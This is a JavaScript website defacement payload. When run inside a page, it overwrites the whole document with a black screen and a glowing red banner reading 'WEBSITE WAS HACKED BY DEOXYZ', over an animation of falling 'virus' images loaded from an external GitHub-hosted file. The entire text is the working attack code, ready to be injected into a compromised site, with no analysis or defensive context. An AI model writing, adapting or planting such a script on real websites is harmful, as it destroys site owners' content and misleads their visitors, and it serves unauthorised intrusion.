(function () {
  const html = `
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }
      html, body {
        height: 100%;
        overflow: hidden;
        font-family: 'Share Tech Mono', monospace;
        background-color: black;
      }
      canvas {
        position: fixed;
        top: 0; left: 0;
        width: 100%;
        height: 100%;
        z-index: 0;
      }
      body::before {
        content: "";
        position: fixed;
        top: 0; left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.6);
        z-index: 1;
      }
      .container {
        position: relative;
        z-index: 2;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
        text-align: center;
        color: red;
      }
      .logo img {
        width: 300px;
        animation: glow 2s ease-in-out infinite alternate;
        margin-bottom: 30px;
      }
      h1 {
        font-size: 2.5rem;
        text-shadow:
          0 0 5px #ff0000,
          0 0 15px #ff0000,
          0 0 30px #ff0033,
          0 0 60px #ff0033;
        animation: glitch 1.5s infinite;
      }
      @keyframes glow {
        0% { filter: drop-shadow(0 0 10px red); }
        100% { filter: drop-shadow(0 0 30px red); }
      }
      @keyframes glitch {
        0% { transform: translate(0); }
        20% { transform: translate(-2px, 2px); }
        40% { transform: translate(2px, -2px); }
        60% { transform: translate(-1px, 1px); }
        80% { transform: translate(1px, -1px); }
        100% { transform: translate(0); }
      }
      @media (max-width: 600px) {
        .logo img { width: 180px; }
        h1 { font-size: 1.8rem; }
      }
    </style>

    <canvas id="canvas"></canvas>
    <div class="container">
      <div class="logo">
        <img src="https://raw.githubusercontent.com/naruto3213213/111/main/thumb-1920-194880-removebg-preview.png" alt="Deoxyz Logo">
      </div>
      <h1>WEBSITE WAS HACKED BY DEOXYZ</h1>
    </div>
  `;

  document.open();
  document.write(html);
  document.close();

  window.onload = function () {
    const canvas = document.getElementById('canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let virusImg = new Image();
    virusImg.src = 'https://raw.githubusercontent.com/naruto3213213/111/main/thumb-1920-194880-removebg-preview.png';

    let viruses = [];
    const virusCount = 50;

    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }

    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    for (let i = 0; i < virusCount; i++) {
      viruses.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        speed: 0.5 + Math.random() * 2,
        size: 20 + Math.random() * 30
      });
    }

    function draw() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      viruses.forEach(v => {
        ctx.drawImage(virusImg, v.x, v.y, v.size, v.size);
        v.y += v.speed;
        if (v.y > canvas.height) {
          v.y = -v.size;
          v.x = Math.random() * canvas.width;
        }
      });
      requestAnimationFrame(draw);
    }

    virusImg.onload = () => draw();
  };
})();
